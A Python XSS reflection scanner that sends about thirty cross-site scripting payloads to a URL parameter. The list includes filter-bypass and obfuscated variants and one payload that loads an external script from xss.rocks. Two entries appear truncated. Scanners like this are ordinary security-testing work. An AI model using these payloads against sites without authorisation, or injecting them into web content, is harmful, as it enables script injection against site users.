# === scanner/xss_scanner.py ===
import requests

def scan(url):
    payloads = [
    "<script>alert('XSS')</script>",                             # Basic
    "\"><script>alert(1)</script>",
    "'><img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<math><mtext></mtext><script>alert(1)</script></math>",
    "<video><source onerror='alert(1)'>",
    "<details open ontoggle=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<a href='javas&#99;ript:alert(1)'>Click</a>",
    "<form><button formaction=javascript:alert(1)>X</button></form>",

    # === Obfuscated / Bypass Payloads ===
    "<scr<script>ipt>alert(1)</scr</script>ipt>",                # Split <script>
    "<img src=x onerror=confirm(1)>",                            # confirm()
    "<IMG SRC=JaVaScRiPt:alert(1)>",                             # Case-insensitive
    "<iframe/src='data:text/html,<script>alert(1)</script>'>",  # data URI
    "<script>/*-->*/alert(1)//--></script>",                     # Comment obfuscation
    "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",  # CharCode
    "<script>this </script>",                      # JS string concat
    "<img src=x onerror=alert(String.fromCharCode(88,83,83))>", # CharCode in attribute
    "<script src=//xss.rocks/xss.js></script>",                  # External script
    "<script>top </script>",                       # Access top window
    "<svg><desc><![CDATA[<script>alert(1)</script>]]></desc></svg>",  # SVG + CDATA
    "<object data='javascript:alert(1)'></object>",              # Object tag
    "<embed src='javascript:alert(1)'></embed>",                 # Embed tag
    "<link rel=stylesheet href='javascript:alert(1)'>",          # CSS link injection (browser dependent)
    "<style>@import 'javascript:alert(1)';</style>",             # CSS-based
    "<img src=`~` onerror=this.onerror=alert;throw 1>",          # Error chain
    "';!--\"<XSS>=&{()}",                                        # Classic filter tester
]

    
    if "=" not in url:
        return False

    for payload in payloads:
        try:
            test_url = url + payload
            res = requests.get(test_url, timeout=5)
            if payload in res.text:
                print(f"[!] Potential XSS detected with payload: {payload}")
                return True
        except Exception as e:
            continue

    return False



